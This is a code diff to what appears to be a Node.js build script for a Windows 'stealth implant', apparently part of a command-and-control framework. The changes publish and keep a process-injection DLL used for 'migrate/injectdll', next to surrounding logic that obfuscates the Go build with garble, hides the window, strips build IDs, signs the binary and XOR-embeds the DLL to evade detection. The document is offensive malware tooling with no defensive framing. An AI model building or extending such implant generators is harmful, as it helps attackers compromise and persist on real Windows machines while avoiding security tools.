@@ -90,6 +90,24 @@ function publishStealthExe(outPath, outName) {
   return { workingDir: WORKING_DIR, workingExe: named, latestStealthExe, workingMetaPath: metaPath };
 }
 
+function publishInjectDll(dllPath, outName) {
+  if (!dllPath || !fs.existsSync(dllPath)) return null;
+  fs.mkdirSync(WORKING_DIR, { recursive: true });
+  const base = String(outName || 'implant').replace(/\.exe$/i, '');
+  const named = path.join(WORKING_DIR, `${base}_inject.dll`);
+  const latest = path.join(WORKING_DIR, 'latest-inject.dll');
+  try {
+    copyExeViaTemp(dllPath, named);
+    copyExeViaTemp(dllPath, latest);
+  } catch (e) {
+    console.warn('[STEALTH] Could not publish inject DLL:', e.message);
+    return null;
+  }
+  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(named)).digest('hex');
+  console.log(`[STEALTH] Inject DLL for migrate/injectdll: ${latest}`);
+  return { injectDll: named, latestInjectDll: latest, injectDllSha256: sha256 };
+}
+
 async function ensureGarbleOnPath() {
   let garblePath = await which('garble');
   if (garblePath) return garblePath;
@@ -124,9 +142,10 @@ async function ensureGarbleOnPath() {
 
 function scrubWorkDirArtifacts(workDir, keepExeName) {
   try {
+    const keepDll = keepExeName.replace(/\.exe$/i, '_inject.dll');
     for (const name of fs.readdirSync(workDir)) {
       const p = path.join(workDir, name);
-      if (name === keepExeName || name === 'meta.json') continue;
+      if (name === keepExeName || name === keepDll || name === 'meta.json') continue;
       const st = fs.statSync(p);
       if (st.isDirectory()) {
         fs.rmSync(p, { recursive: true, force: true });
@@ -225,6 +244,7 @@ async function generateWindowsStealthImplant(options = {}) {
   );
 
   let injectDllPacked = false;
+  let builtInjectDllPath = null;
   const mingwBin = findMingwBin();
 
   if (mingwBin) {
@@ -248,6 +268,7 @@ async function generateWindowsStealthImplant(options = {}) {
       );
       if (fs.existsSync(dllPath) && fs.statSync(dllPath).size > 1000) {
         injectDllPacked = true;
+        builtInjectDllPath = dllPath;
         writeEncryptedEmbeddedDll(workDir, dllPath, stamp);
         console.log('[STEALTH] Migrate DLL XOR-embedded in EXE (no separate download)');
       }
@@ -261,6 +282,19 @@ async function generateWindowsStealthImplant(options = {}) {
   const baseName = (options.outputName || defaultStealthOutputBase()).replace(/[<>:"/\\|?*\s]/g, '_');
   const outName = /\.exe$/i.test(baseName) ? baseName : `${baseName}.exe`;
   const outPath = path.join(workDir, outName);
+
+  let injectDllPublish = null;
+  if (injectDllPacked && builtInjectDllPath) {
+    injectDllPublish = publishInjectDll(builtInjectDllPath, outName);
+    if (injectDllPublish) {
+      const buildDllCopy = path.join(workDir, outName.replace(/\.exe$/i, '_inject.dll'));
+      try {
+        fs.copyFileSync(builtInjectDllPath, buildDllCopy);
+      } catch (_) {
+        /* ignore */
+      }
+    }
+  }
 
   const ldflags = `-s -w -H=windowsgui -X main.BuildMode=exe -X main.PolyBuildId=${buildid} -buildid=${buildid}`;
   const buildEnv = {
@@ -325,6 +359,8 @@ async function generateWindowsStealthImplant(options = {}) {
     format: 'exe',
     singleArtifact: true,
     injectDllPacked,
+    injectDllPath: injectDllPublish?.latestInjectDll || injectDllPublish?.injectDll || null,
+    injectDllSha256: injectDllPublish?.injectDllSha256 || null,
     stealthBuild: true,
     authenticodeSigned: !!signResult.signed,
     signPublisher: signResult.publisher,
@@ -346,6 +382,9 @@ async function generateWindowsStealthImplant(options = {}) {
         sha256,
         workingExe: workPaths.workingExe,
         latestStealthExe: workPaths.latestStealthExe,
+        injectDllPacked: meta.injectDllPacked,
+        latestInjectDll: injectDllPublish?.latestInjectDll || null,
+        injectDllSha256: meta.injectDllSha256 || null,
         createdAt: meta.createdAt,
       },
       null,
